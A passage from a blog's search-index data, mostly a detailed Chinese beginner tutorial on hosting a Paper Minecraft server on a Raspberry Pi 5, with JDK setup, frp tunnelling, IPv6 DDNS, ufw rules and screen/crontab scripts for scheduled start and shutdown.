&lt;= m; ++i){        int u = read(), v = read(), w = read();        add(u, v, w);        add(v, u, w);    } q = read();    while(q--){        c = read(), s = read(), e = read();        solve();    }}\n\n    \n  ","categories":["算法"]},{"title":"[超详细] 树莓派5 搭建MC服务器 全过程记录","url":"/2025/02/21/%E8%B6%85%E8%AF%A6%E7%BB%86-%E6%A0%91%E8%8E%93%E6%B4%BE5-%E6%90%AD%E5%BB%BAMC%E6%9C%8D%E5%8A%A1%E5%99%A8-%E5%85%A8%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/","content":"前言我有一块8GB RAM的RaspBerry Pi 5, 一直在吃灰. 后来决定在上面搭建一个Minecraft服务器供同学游玩, 然而搭建的时候还是踩了不少坑. 比如, 原来的官方RaspBerry Pi OS是基于Debian Bullseye的, 但新版改成Debian Bookworm了, 网上的很多教程都不再适用. 再如, 还要解决宿舍断电和公网访问的问题, 网上似乎没有把整个搭建过程讲的非常清楚的文章, 于是我便决定把我的搭建过程记录下来, 或许可以帮到 同样想用树莓派搭建Minecraft服务器的人 (真的会有人用树莓派干这事吗).\n不过, 由于我对Linux不是很熟悉, 一些解决方案很可能不是最优的, 所以我的思路和操作只供参考, 也欢迎大佬在评论区提出更好的思路.\n当然, 这里的大部分操作也适用于非RaspBerry Pi OS的Linux服务器.\n这篇文章是萌新向 (虽然我清楚, 想到用Linux作为服务器的应该都是大佬), 每一步我都会啰嗦地讲解, 以保证小白也能看懂. 大佬可以不看或者根据目录跳着看.\n\n\n在一番折腾后, 你将:\n\n失去金钱和时间\n获得游戏的快乐\n学习相关命令\n积累运维经验\n\n\n\n\n准备工作要有一块RaspBerry Pi 5, MicroSD卡建议用闪迪等大厂的卡, 64GB 以上最好.\n\n  \n    如果已经设置好系统, 就跳过这一步 \n\n  \n\n烧录系统给MicroSD卡烧录系统, 建议使用官方的烧录工具Raspberry Pi Imager, 小白也能轻松上手.\n插入MicroSD卡, 打开烧录工具, 填写设备型号、系统(官方64位)、储存卡.\n\n然后按NEXT. 编辑一下设置.\n\n设置用户名和密码 (一定要设置强密码!!!), WIFI填写树莓派和PC能同时连接的设备, 这里我填的是 手机热点.\n\n如果你熟悉SSH的公钥登入, 建议SERVICES页里把SSH改成公钥登入, 比用密码更安全. 但如果不熟悉且懒得折腾的话, 还是保持用密码登入吧.\n再次提醒: 一定要设置强密码!!!\n保存设置, 开始烧录.\n烧录后把MicroSD卡插到树莓派上, 插电开机, 等待系统启动.\n树莓派开机会自动连接烧录阶段保留的WIFI, PC也切换到这个WIFI下.\n\n换源这步讲解如何SSH登入树莓派, 并更换软件源. 会的话直接跳过就好.\n需要2样东西: 树莓派的IP 和 SSH客户端.\n获取树莓派IP其实就是获取局域网其它设备的IP. 方法不少, 工具也很多.\n如果连的是路由器, 可以直接登入路由器后台查看.\n或者使用一些局域网IP扫描工具, 这里推荐2个:\n\nWNetWatcher: 最推荐, 体积小, 扫描快, 界面干净, 下载链接在官网最下面.\nAdvanced IP Scanner: 功能全面, 但相应地, 体积大, 扫描也慢, 需要自己指定IP段.\n\n以WNetWatcher v2.42为例, 下载解压后, 运行程序, 程序启动会自动扫描, 不出意外就能看到树莓派的IP了.\n\nSSH连接树莓派 &amp; 换源然后就是SSH连接树莓派, 这里我推荐用PuTTY. 不推荐使用Xshell, 其部分版本存在后门, 不安全.\n如果你的终端已经有ssh命令, 你也可以直接ssh &lt;name&gt;@&lt;树莓派IP&gt;来登入.\n但我使用PuTTY, 所以接下来都是以PuTTY为例.\n\n这里填入树莓派的IP地址, 端口默认22, 然后点击下方的Open.\n如果有弹出PuTTY Security Alert窗口, 选择Accept即可.\n然后, 在终端中输入树莓派的账号和密码(烧录系统时设置的, 注意密码没有回显, 看不到输入的密码是正常的), 回车.\n登入成功后, 参照这篇文章换源.\n(懒得自己再写一遍.)\n\n安装jdk与paper端Java服务端实在太多了, 常见的有以下几种:\n\n官方服务器: 纯原版, 最稳定, 但加不了插件和mod.\nForge端: 可以在服务器上装Forge Mods.\nFabric端: 可以在服务器上装Fabric Mods.\nPaper: 属于Spigot的分支, 兼容大部分Bukkit和Spigot插件, 有很好的性能和优化选项.\nPurpur: 基于Paper, 应该比Paper好使, 但我没去了解过, 不做点评.\nMohist: 可以同时装Forge Mods和 Bukkit&#x2F;Spigot 插件, 很强大.\nMCSManager: 非常流行的面板服, 一键部署, 功能全面.\n\n一般来说, 用MCSManager来部署应该是最简单最方便的, 网上的教程也很多, 但是, 用面板服需要安装一些依赖, 而且很多功能可能是用不上的, 同时可能也更吃性能. 而我偏好轻量、简洁、按需添加功能的应用, 因此我没有选择用面板服.\n再加上各种各样的原因, 最终我选择的是Paper端, 你可以根据自己的需求和兴趣选择其它的服务端.\n以下教程是针对Paper端的, 如果想使用其它服务端, 请自行查阅对应的官方文档.\n\n安装jdk &amp; 配置系统变量根据Paper(Minecraft)版本, 选择对应的Java JDK进行安装.\n\n\n\nPaper Version\nRecommened Java Version\n\n\n\n1.8 ~ 1.11\nJava 8\n\n\n1.12 ~ 1.16.4\nJava 11\n\n\n1.16.5\nJava 16\n\n\n1.17.1 ~ 1.18.1+\nJava 21\n\n\n\n\n上表出自Paper的官方文档\n\n\n我选择的Minecraft版本是1.21.1, 所以要安装JDK 21.\n一般来说, 可以直接使用apt安装 openjdk-21-jdk:\nsudo apt update &amp;&amp; sudo apt install openjdk-21-jdk\n\n但是, Debian的软件仓库更新很慢, 而OpenJDK 21又是一个相对较新的版本, 我使用上述命令的时候报错了:E: Unable to locate package openjdk-21-jdk.\n\n  \n    如果你能通过上述命令安装, 可以跳过以下手动安装的步骤. \n\n  \n\n前往Oracle网站, 根据系统架构选择对应下载链接.\n\n如果是树莓派5 + 官方系统, 选第一个.\nwget https://download.oracle.com/java/21/latest/jdk-21_linux-aarch64_bin.tar.gztar -zxvf jdk-21_linux-aarch64_bin.tar.gz\n\n\n上面的步骤完成后, 当前目录会生成一个jdk-21.x.x文件夹, 可以ls查看或者直接观测tar命令的输出.\n把这个文件夹移到合适的目录, 我选择的是/usr/local/.\nsudo mv jdk-21.0.5 /usr/local/\n\n接下来, 把java添加到环境变量, 也就是~/.bashrc, 在该文件末尾添加即可.\n可以使用vim或nano等文本编辑器, 或者直接用echo命令添加:\necho &quot;export JAVA_HOME=/usr/local/jdk-21.0.5&quot; &gt;&gt; ~/.bashrcecho &quot;export PATH=\\$JAVA_HOME/bin:\\$PATH&quot; &gt;&gt; ~/.bashrcsource ~/.bashrc\n\n然后, 输入java --version验证是否安装成功.\n$ java --versionjava 21.0.5 2024-10-15 LTSJava(TM) SE Runtime Environment (build 21.0.5+9-LTS-239)Java HotSpot(TM) 64-Bit Server VM (build 21.0.5+9-LTS-239, mixed mode, sharing)\n\n这样就说明安装成功了.\n\n安装paper &amp; 启动服务器到Paper官网下载需要的版本. 我选择的是1.21.1, 目前最新是1.21.4.\n如果要下载旧版本, 点击官网下载按钮下面的build explorer.\n我这里选择1.21.1的latest build #132 版本.\n\n你可以选择PC下载后用PuTTY的 PSFTP传给树莓派, 或者直接复制下载链接, 然后在树莓派中用wget下载.\n我演示后者.\n在下载前, 先创建一个文件夹, 作为服务器的目录. 我直接在~下创建了一个paper文件夹. (太随意了吧)\nmkdir ~/papercd ~/paper\n\n然后下载paper.\nwget https://api.papermc.io/v2/projects/paper/versions/1.21.1/builds/132/downloads/paper-1.21.1-132.jar\n\n下载后会在目录中得到一个paper-1.21.1-132.jar文件. 如果下载的是别的版本, 文件名会不一样. 自己修改命令行里的文件名即可.\n输入以下命令来第一次启动你的服务端!\njava -jar paper-1.21.1-132.jar\n\n等待片刻, 会看到这样的WARN:\nDownloading mojang_1.21.1.jarApplying patchesStarting org.bukkit.craftbukkit.Main*** Warning, you&#x27;ve not updated in a while! ****** Please download a new build as per instructions from https://papermc.io/downloads/paper ***[16:58:32 INFO]: [bootstrap] Running Java 21 (Java HotSpot(TM) 64-Bit Server VM 21.0.5+9-LTS-239; Oracle Corporation null) on Linux 6.6.74+rpt-rpi-2712 (aarch64)[16:58:32 INFO]: [bootstrap] Loading Paper 1.21.1-132-ver/1.21.1@b48403b (2024-11-21T10:14:27Z) for Minecraft 1.21.1[16:58:32 INFO]: [PluginInitializerManager] Initializing plugins...[16:58:32 INFO]: [PluginInitializerManager] Initialized 0 plugins[16:58:34 INFO]: [ReobfServer] Remapping server...[16:58:46 WARN]: Failed to load eula.txt[16:58:47 INFO]: You need to agree to the EULA in order to run the server. Go to eula.txt for more info.[16:58:47 INFO]: [ReobfServer] Done remapping server in 13152ms.\n\n看到Failed to load eula.txt别惊慌, 第一次启动时, 这个是正常现象. 我们需要同意eula.txt里的条款才能运行服务器.\n使用vim或nano等文本编辑器, 把eula.txt最后一行的eula=false改为eula=true, 或者直接输入以下命令:\nsed -i &#x27;$s/false/true/&#x27; eula.txt\n\n此时, 你可以使用ls命令查看一下目录结构, Ravelloh大佬在这篇文章中给出了每个配置项的含义, 可以参考修改服务器配置.\n你可以在Paper官网或Modrinth上获取想要的插件, 我这里就不介绍插件和服务器的配置了, 这需要服主自由发挥了.\n一般来说, 服务器可以用这样的命令来启动:\njava -Xms4G -Xmx4G -jar paper-1.21.1.jar --nogui\n\n解释一下上面的参数:\n\n-Xms4G: 最小内存分配, 这里是4GB.\n-Xmx4G: 最大内存分配, 这里也是4GB. 一般来说这两个量设置成一样的就行, 具体大小要看你的RAM和服务器人数了.\n-jar: 表示要执行jar文件.\npaper-1.21.1.jar: 刚刚下载的Paper的jar文件.\n--nogui: 启动时不显示GUI界面.\n\n但Ravelloh大佬的文章里给出了如下优化命令:\njava -Xms10G -Xmx10G -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:InitiatingHeapOccupancyPercent=15 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar paper.jar --nogui\n\n可以参考使用上述命令.\n需要修改一下上述命令中的-Xms, -Xmx, 以及paper.jar. 其它保持不变.\n在终端执行修改后的命令, 等待片刻, 服务器就启动好啦!\n\n[可选] 远程桌面访问树莓派SSH已经允许我们远程控制树莓派了, 但如果你喜欢图形化界面, 你也可以通过远程桌面来访问树莓派.\n树莓派自带vnc服务, 只需要开启它就行了.\n开启vnc服务执行\nsudo raspi-config\n\n打开树莓派配置工具.\n\n方向键↑和↓选择选项, ←和→选择低下的&lt;Select&gt;和&lt;Finish&gt;, 回车或空格表示选择当前选项.\n依次选择 &lt;Interface Options&gt; &gt; &lt;VNC&gt; &gt; Yes.\n然后, 会退出配置工具并出现一些命令, 这些命令用于开启vnc服务.\n这时, 建议先sudo reboot重启一下树莓派.\n然后, 可简单通过如下命令判断vnc服务是否开启:\nsystemctl status | grep vnc\n\n\n像这样, 就说明vnc服务已经开启了.\n\nPC远程访问树莓派首先, 需要一个vnc客户端, 到RealVNC官网下载.\n安装, 运行. (不需要登入)\n\n这里输入树莓派的IP地址, 回车.\n\n输入用户名和密码, 回车.\n然后就可以看到树莓派的桌面了.\n\n外网访问服务器如何更改WIFI目前, 树莓派连的是手机的热点, 手机热点并不能作为长期稳定的WIFI, 所以我们需要更换树莓派的WIFI.\n注意, 选取的WIFI需要满足这样的条件:\n\n长期稳定\nPC和树莓派都能连上, 且WIFI支持局域网内设备互相访问, 否则无法SSH控制树莓派.\n\n之所以在最开始推荐使用手机热点, 是因为遇到我觉得手机热点比路由器要稳定. (可能哪天路由器就莫名其妙连不上Internet了).\n网上关于树莓派切换WIFI的文章, 都是清一色的更改wpa_supplicant.conf.\n但这个方法在新版系统上失效了.\n新的树莓派官方系统使用NetworkManager来管理网络, 所以我们需要使用nmcli命令来更改网络连接.\n\n  \n    \n      你需要掌握的3条nmcli命令\n\n    \n    \n      sudo nmcli device wifi rescan\n\n该命令会重新扫描附近的WIFI.\nsudo nmcli device wifi list\n\n该命令会列出扫描到的所有WIFI.\nsudo nmcli device wifi connect &lt;SSID&gt; password &lt;password&gt;\n\n该命令会连接指定的WIFI, 其中&lt;SSID&gt;是WIFI的名称, &lt;password&gt;是WIFI的密码.\n\n    \n  \n\n更改WIFI后, PC也要重新连接WIFI, 才能SSH连接树莓派.\n树莓派会自动连接nmcli连接过的WIFI. (但断网重连机制可能有点问题)\n\n外网访问方法1: 内网穿透服务器虽然启动了, 但只有同一个局域网下的玩家才能访问, 连接其它WIFI的小伙伴访问不了.\n内网穿透是我最开始的解决方案, 我推荐使用Sakura Frp, 具体使用请参见官方文档.\n免费节点不稳定, 延迟很随机, 如果服务器要长期运行, 建议购买青铜VIP, 10元&#x2F;月.\n服务 &gt; 隧道列表 &gt; 创建隧道\n\n选择节点, 设置隧道名称, 填写本地游戏端口(默认是25565), 其它依需求填写.\n\n创建后, 在这里查看配置文件.\n \n记住这个 -f xxxx:xxxx 参数.\n服务 &gt; 软件下载 &gt; frpc\n根据系统架构选择对应的版本(树莓派就选arm64), 复制下载链接, 用wget下载.\n\n接着, 选择保存frpc的位置, 这里我选择的是~/natfrp.\nmkdir ~/natfrpcd ~/natfrpwget https://nya.globalslb.net/natfrp/client/frpc/0.51.0-sakura-9.3/frpc_linux_arm64mv frpc_linux_arm64 frpcsudo chmod +x frpc\n\n\n  \n    Tip: sudo .&#x2F;执行文件时, 如果显示command not found, 就用sudo chmod +x &lt;文件名&gt;来添加执行权限. \n\n  \n\n之后, 就可以通过执行./~natfrp/frpc -f xxxx:xxxx来启动隧道了!\n\n隧道启动后, 就可以用控制台里提供的地址来连接服务器了! (当然, 服务器需要是开启状态.)\n外网访问方法2: 利用公网ipv6与DDnS如果你的路由器支持ipv6, 且可以被外网访问, 那么恭喜你, 你不需要内网穿透了!\n这篇文章里, 和frpc有关的部分, 都可以不看了. 脚本里有frpc的部分, 都可以删了.\n尽管如此, 我还是建议你在读完文章的其它内容后, 最后再来阅读这部分. 因为我是在摸索完其它内容后才发现路由器支持ipv6的, 时间顺序上这个part排在最后.\n接下来讲怎么判断是否符合条件, 以及如何配置DDnS.\n判断是否支持ipv6如果路由器是很老的, 那大概率是不支持了. 否则就按下面的步骤过一遍来判断.\nPC连接到目标WIFI, 浏览器访问https://test-ipv6.com , 如果得分为10, 则可以进行下一步的测试了.\n\n打开WNetWatcher, 如果上面有ipv6地址, 说明支持公网ipv6的可能性很高了.\n\n如果没有也先别放弃, 在浏览器访问路由器的IP, 输入管理员账号密码(通常贴在路由器下面)进入路由器后台.\n因为各家路由器后台管理系统都不一样, 我总结不出什么通法, 反正就每个页面都点开看看, 找找有没有ipv6的出现.\n\n像我这里, 很明显是支持ipv6的.\n如果找不到ipv6的选项, 那就说明你的路由器不支持公网ipv6. 如果有, 保证其是开启状态.\n接下来, 找到防火墙选项, 关闭或将防护等级调低, 这一步是为了让内网暴露在公网上.\n\n注意, 你需要清楚自己在做什么, 内网暴露在公网上意味着设备被攻击渗透的可能性大大增加.\n如果害怕, 且没有网安经验, 还是建议不要随意关闭防火墙.\n然后, 把WNetWatcher上路由器或树莓派的ipv6地址复制下来, PC切换到别的WIFI, Win+R键入cmd打开终端, 输入这样的命令:\nping -6 &lt;ipv6地址&gt;\n\n如果能ping通, 如下图, 说明你的路由器支持公网ipv6!\n\n如果此时树莓派上正在运行服务端, 且你可以通过[ipv6地址]:端口, 比如[2409:1145:1919:abcd:...:0721]:25565进入服务器, 那么恭喜你, 你的服务器是可以被外网访问的!\n配置DDnS经过上面的检查, 已经保证服务器可以通过ipv6地址来访问了.\n那为什么还要配置DDnS(Dynamic Domain Name System)呢?\n因为这个ipv6地址是动态变化的, 而我们希望它是一个固定的地址&#x2F;域名. 所以就需要配置DDnS.\n配置DDnS可分为3步:\n\n找域名注册商获取域名\n找DDnS服务商获取解析服务\n本地配置DDnS解析更新\n\n在撰稿时, 我原来使用的免费域名服务商(nic.us.kg)挂了…\n详情请见这里\n所以, 我就没打算细讲第1步和第2步的内容了.\n第1步和第2步, 可以参考这篇文章.\n这里讲讲第3步. \n我们需要一个工具, 可以在ipv6地址发生变化时, 将新的DDnS解析提交给DDnS服务商(这里使用的是Cloudflare).\nddns-go就可以实现我们的需求.\n在Release页根据系统架构下载对应的ddns-go, 如果是树莓派5, 就选择ddns-go_&lt;version&gt;_linux_arm64.tar.gz, 复制下载链接, 在树莓派上用wget下载. (提前cd到一个用于存放下载文件的目录)\n如果卡住的话就稍微等一等, ddns-go文件挺小, 应该是能成功下载的.\n下载完成后, 用tar解压, 参照README执行安装命令.\n我是直接sudo ./ddns-go -s install了.\ntar -zxvf &lt;下载的.tar.gz文件&gt;\n\n参见README进行安装, 这里我直接执行./ddns-go -s intall了.\n安装完成后, ddns-go会在9876端口上开放配置网页, 在PC浏览器上访问http://&lt;树莓派IP&gt;:9876, 输入树莓派的用户名和密码进入Web配置界面.\n选择DDnS服务商 (NameSilo是自带DDnS服务的, 但我是从.us.kg转的NameSilo, 之前用Cloudflare, 所以我还是接着用Cloudflare了), 开启ipv6解析, 选择通过网卡获取IP, 输入你的域名, 保存.\n稍等片刻, ping一下你的域名, 如果显示的是树莓派的ipv6地址, 说明DDnS配置成功了!\n[可选] 设置防火墙经过上面的步骤, 虽然可以通过域名访问服务器了 但树莓派的其它端口(如ssh的22, vnc-server的5900)也同时暴露在公网上了.\n这非常不安全. 我们只希望服务器的25565端口被公网访问.\n有多种解决思路, 这里我选择设置防火墙, 我觉得这样最安全.\n\n  \n    防火墙一定要谨慎设置, 别把自己锁在服务器外了! \n\n  \n\n我的防火墙规则: 只允许内网设备访问22和5900端口.\n我使用的命令工具是ufw. 通过sudo apt install ufw安装.\n\n  \n    注意, ufw的默认规则是: 拒绝所有传入的连接，并允许所有传出的连接. \n\n  \n\n通过如下命令添加防火墙规则 (根据你的实际情况进行修改):\n# 允许任意IP访问25565端口, 25565改成你的Minecraft服务器端口.sudo ufw allow from any to any port 25565# 允许3种常见的内网IP段访问22和5900端口.sudo ufw allow from 192.168.0.0/16 to any port 22sudo ufw allow from 192.168.0.0/16 to any port 5900sudo ufw allow from 10.0.0.0/8 to any port 22sudo ufw allow from 10.0.0.0/8 to any port 5900sudo ufw allow from 172.16.0.0/12 to any port 22sudo ufw allow from 172.16.0.0/12 to any port 5900# 禁止所有对22和5900的访问. 这里ufw规则的检索顺序是从上到下, 先指定的规则优先生效.sudo ufw deny 22sudo ufw deny 5900# 开启防火墙sudo ufw enable\n\n之后, 输入sudo ufw status numbered, 如果输出为:\nStatus: active     To                         Action      From     --                         ------      ----[ 1] 25565                      ALLOW IN    Anywhere[ 2] 22                         ALLOW IN    192.168.0.0/16[ 3] 5900                       ALLOW IN    192.168.0.0/16[ 4] 22                         ALLOW IN    10.0.0.0/8[ 5] 5900                       ALLOW IN    10.0.0.0/8[ 6] 22                         ALLOW IN    172.16.0.0/12[ 7] 5900                       ALLOW IN    172.16.0.0/12[ 8] 22                         DENY IN     Anywhere[ 9] 5900                       DENY IN     Anywhere[10] 25565 (v6)                 ALLOW IN    Anywhere (v6)[11] 22 (v6)                    DENY IN     Anywhere (v6)[12] 5900 (v6)                  DENY IN     Anywhere (v6)\n\n说明防火墙规则设置成功.\n先不要关闭此时的SSH终端, 打开新的SSH终端, 如果用域名无法连接, 用本地树莓派IP可以连接, 说明防火墙设置成功.\n\n终端会话管理 – screen你可能意识到了这样的问题: paper.jar和frpc都会阻塞进程, 要如何同时运行它们?\n你可能会觉得, 简单呀, 开2个终端不就行了? 用PuTTY连2次.\n但这样还是有问题: 退出SSH终端后, 程序就中断了.\n于是, 我们需要一个管理终端会话的工具, 它需要有以下功能:\n\n在不需要交互的时候, 可以把进程放到后台运行. (退出终端就不会导致程序退出)\n在需要交互的时候, 可以把后台的进程调到前台. (打开新终端后可以恢复对话)\n\n这里我使用的工具是screen.\n你可能也听说过相关的工具, 比如tmux. 诚然, 它比screen要强大的多, 但我觉得它有点overdesign了, screen已经能满足我的需求, 所以我还是选择screen. 以下的内容也是以screen为例.\n安装screen:\nsudo apt install screen\n\n\n  \n    \n      你需要掌握的screen用法\n\n    \n    \n      \n    .note-large .notel-content table {\n        border-spacing: 0;\n        border-collapse: collapse;\n        width: 100%;\n        overflow: auto;\n        margin-bottom: 1.2rem;\n        box-shadow: var(--redefine-box-shadow-flat);\n        border-radius: 14px;\n    }\n\n    .note-large .notel-content table thead th {\n        border-bottom: 1px solid var(--shadow-color-1);\n        background-color: var(--third-background-color) !important;\n    }\n\n    .note-large .notel-content table thead th:first-child {\n        border-top-left-radius: 14px;\n    }\n\n    .note-large .notel-content table thead th:last-child {\n        border-top-right-radius: 14px;\n    }\n\n    .note-large .notel-content table tbody tr:last-child td:first-child {\n        border-bottom-left-radius: 14px;\n    }\n\n    .note-large .notel-content table tbody tr:last-child td:last-child {\n        border-bottom-right-radius: 14px;\n    }\n\n    .note-large .notel-content table td,\n    .note-large .notel-content table th {\n        padding: 8px 16px;\n        border-left: 1px solid var(--shadow-color-1);\n    }\n\n    .note-large .notel-content table td:first-child,\n    .note-large .notel-content table th:first-child {\n        border-left: none;\n    }\n\n    .note-large .notel-content table tr {\n        background-color: var(--background-color);\n    }\n\n    .note-large .notel-content table tr:nth-child(2n) {\n        background-color: var(--second-background-color);\n    }\n\n\nscreen命令基本语法screen [-opts] [cmd [args]]\n\n其中, -opts是screen命令的选项, cmd是要执行的命令, args是命令的参数.&#96;\n比较常用的-opts如下表, 我觉得英文描述很清楚, 所以就不翻译了. (也可以自行screen --help查看)\n\n\n\n选项\n功能\n\n\n\n-d (-r)\nDetach the elsewhere running screen (and reattach here).\n\n\n-dmS name\nStart as daemon: Screen session in detached mode.\n\n\n-D (-r)\nDetach and logout remote (and reattach here).\n\n\n-D -RR\nDo whatever is needed to get a screen session.\n\n\n-h lines\nSet the size of the scrollback history buffer.\n\n\n-ls [match] or -list\nDo nothing, just list our SockDir [on possible matches].\n\n\n-Logfile file\nSet logfile name.\n\n\n-m\nIgnore $STY variable, do create a new screen session.\n\n\n-q\nQuiet startup. Exits with non-zero return code if unsuccessful.\n\n\n-r [session]\nReattach to a detached screen process.\n\n\n-R\nReattach if possible, otherwise start a new session.\n\n\n-S sockname\nName this session .sockname instead of ...\n\n\n-U\nTell screen to use UTF-8 encoding.\n\n\n-wipe [match]\nDo nothing, just clean up SockDir [on possible matches].\n\n\n-x\nAttach to a not detached screen. (Multi display mode).\n\n\n-X\nExecute  as a screen command in the specified session.\n\n\n\nscreen命令常见用法\n创建会话\n\nscreen -S &lt;name&gt;    # 创建名为&lt;name&gt;的会话并进入screen -dmS &lt;name&gt;  # 创建名为&lt;name&gt;的会话并在后台运行\n\n\n列出会话\n\nscreen -ls  # 列出当前用户的所有会话\n\n\n进入会话\n\nscreen -r &lt;name&gt;  # 进入名为&lt;name&gt;的会话\n\n\n退出会话\n如果你的当前终端正在该会话中, 按下Ctrl+A再按D即可退出会话.\n如果你的当前终端并不在该会话中, 会话正被另一个终端使用, 你可以用以下命令退出另一个终端中的会话:\n\n\n\nscreen -d &lt;name&gt;\n\n\n终止进程\n\nscreen -X -S &lt;name&gt; quit  # 终止名为&lt;name&gt;的会话中的所有进程\n\n或\nkill &lt;pid&gt;  # &lt;pid&gt;可由`screen -ls`命令获取\n\n\n向进程发送命令\n\nscreen -x -S &lt;name&gt; -p 0 -X stuff &quot;[cmd]$(printf \\\\r)&quot;# stuff相当于往进程的输入缓冲区中输入命令, 最后的$(printf \\\\r)是回车符, 没有它, 命令不会被执行.\n\n    \n  \n\n\n开服脚本有了screen之后, 我们就可以方便地创建、终止、进入、退出会话了.\n由此我们就可以给出开服脚本:\n#!/bin/bash# 在后台创建screenscreen -dmS mc1screen -dmS frpc1screen -dmS frpc2# paper端screen -x -S mc1 -p 0 -X stuff &quot;cd paper$(printf \\\\r)&quot;screen -x -S mc1 -p 0 -X stuff &quot;/usr/local/jdk-21.0.5/bin/java -Xms5G -Xmx5G -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:InitiatingHeapOccupancyPercent=15 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar paper-1.21.1.jar --nogui$(printf \\\\r)&quot;# 这里java用了全路径, 是因为脚本在某些场合执行的时候, 不会使用系统环境变量, 用全路径比较保险.# 注意, 这里的-Xms5G -Xmx5G和最后的paper-1.21.1.jar要根据你的实际情况修改!screen -d mc1# 内网穿透1screen -x -S frpc1 -p 0 -X stuff &quot;cd natfrp$(printf \\\\r)&quot;screen -x -S frpc1 -p 0 -X stuff &quot;./frpc -f xxxx:xxxx$(printf \\\\r)&quot;# 这里的-f xxxx:xxxx修改为你自己的配置信息, 下同screen -d frpc1# 内网穿透2screen -x -S frpc2 -p 0 -X stuff &quot;cd natfrp$(printf \\\\r)&quot;screen -x -S frpc2 -p 0 -X stuff &quot;./frpc -f yyyy:yyyy$(printf \\\\r)&quot;screen -d frpc2# 内网穿透3screen -x -S frpc3 -p 0 -X stuff &quot;cd natfrp$(printf \\\\r)&quot;screen -x -S frpc3 -p 0 -X stuff &quot;./frpc -f zzzz:zzzz$(printf \\\\r)&quot;screen -d frpc3# 可以对同个本地端口建立多条映射隧道, 相当于备用节点.\n\n使用nano编辑器将上述脚本保存到~/auto/start_server.sh中 (或其它目录):\n\n  \n    以下是保姆级教程, 给真·Linux萌新看的 \n\n  \n\n用nano新建start_server.sh文件:\nmkdir ~/autonano ~/auto/start_server.sh\n\n根据你的情况修改上述脚本, 复制后, 在PuTTY终端窗口中的打开的nano编辑器中右键即可复制, 按Ctrl+O保存, 再按Ctrl+X退出.\n这之后可以执行\ncat ~/auto/start_server.sh\n\n看看输出内容是否是预期的脚本.\n执行\nsudo chmod +x ~/auto/start_server.sh\n\n来赋予可执行权限.\n以后就可以直接bash ~/auto/start_server.sh来启动服务器了.\n服务器启动后, 可以用screen -r mc1来查看服务器后台.\n\n设置定时开关服我是在学校宿舍开服, 于是就面临这样一个难题: 断电. 晚上宿舍会定时断电.\n我们学校的宿舍断电时间为: 周日到周四的晚上12点.\n所以, 我们需要设置定时任务, 让树莓派在12点前自动停服关机.\n宿舍在早上6点来电, 树莓派在重新通电后会自动开机, 于是自动开服就有2个方案: 定时开机, 开机自启.\n考虑到每次开机的时候, 我不一定是想要开服, 所以我选择了定时开机.\n谈到定时任务, 离不开一个强大的工具: crontab. 树莓派官方系统已经自带.\n菜鸟教程上有介绍crontab命令的文章, 我这里就不赘述其用法了.\n注意sudo crontab -e和crontab -e不同, 请全部使用crontab -e.\n关服脚本在使用crontab之前, 先创建一个关服脚本~/auto/stop_server.sh.\nnano ~/auto/stop_server.sh\n\n脚本内容如下:\n#!/bin/bash# 关闭服务器screen -S mc1 -p 0 -X stuff &quot;kickall$(printf \\\\r)&quot;# 先把所有玩家踢出去screen -S mc1 -p 0 -X stuff &quot;save-all$(printf \\\\r)&quot;# 保存游戏screen -S mc1 -p 0 -X stuff &quot;stop$(printf \\\\r)&quot;# 关服screen -S &quot;mc1&quot; -X quit# 终止 mc1 会话# 关闭内网穿透screen -S &quot;frpc1&quot; -p 0 -X stuff &quot;^C&quot;screen -S &quot;frpc1&quot; -X quitscreen -S &quot;frpc2&quot; -p 0 -X stuff &quot;^C&quot;screen -S &quot;frpc2&quot; -X quitscreen -S &quot;frpc3&quot; -p 0 -X stuff &quot;^C&quot;screen -S &quot;frpc3&quot; -X quit\n\n别忘了执行\nsudo chmod +x ~/auto/stop_server.sh\n\n来赋予可执行权限.\n\n设置定时任务终端键入\ncrontab -e\n\n首次运行时会让你选择默认编辑器, 如果什么都不懂, 建议选择nano: 只要会Ctrl+O保存、Ctrl+X退出, 就行.\n然后, 在编辑器最后添加如下内容:\n55 23 * * 0-4 bash auto/stop_server.sh# 在周日到周四, 晚上23:55分, 执行关服脚本.57 23 * * 0-4 sudo shutdown -h now# 在周日到周四, 晚上23:57分, 立即关机.5 6  * * 1-5 bash auto/start_server.sh# 在周一到周五, 早上6:05分, 执行开服脚本.\n\n然后, 按Ctrl+O保存, 再按Ctrl+X退出.\n之后, 可输入crontab -l来查看定时任务是否设置成功.\n如果你想做一个定时关服提醒, 可以创建一个~/auto/warn_server.sh文件, 写入如下内容:\n#!/bin/bashscreen -S mc1 -p 0 -X stuff &quot;bc Warning: The server will be shutdown in 10 min!$(printf \\\\r)&quot;screen -d mc1\n\nstuff后的内容就是要在paper终端中输入的命令, 我这里用的是EssentialsX插件的bc命令, 如果你没有安装EssentialsX, 把bc改成say也可以.\n别忘了执行:\nsudo chmox +x ~/auto/warn_server.sh\n\n然后, crontab -e, 添加如下内容:\n45 23 * * 0-4 bash auto/warn_server.sh\n\n就可以实现关服前10分钟提醒服内玩家了.\n\n[可选] 前台执行定时任务crontab默认在后台执行任务. 如果你的树莓派有一块显示屏, 你希望它能显示服务器的终端, 也就是在前台执行auto/start_server.sh, 可以crontab 